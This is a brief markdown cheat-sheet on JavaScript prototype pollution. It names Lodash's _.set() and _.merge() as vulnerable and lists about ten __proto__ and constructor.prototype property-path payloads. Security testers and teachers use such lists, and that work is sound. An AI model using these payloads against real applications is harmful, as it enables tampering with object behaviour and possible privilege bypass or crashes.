# Prototype pollution

### Vulnerable functions

#### Lodash

`_.set()`

`_.merge()`

```
__proto__.polluted
constructor.prototype.polluted
__proto__['polluted']
__proto__.constructor.prototype.polluted
['__proto__'].polluted
['__proto__']['pollluted']
constructor['prototype'].polluted
constructor['prototype']['polluted']
['constructor']['prototype'].polluted
['constructor']['prototype']['polluted']
```
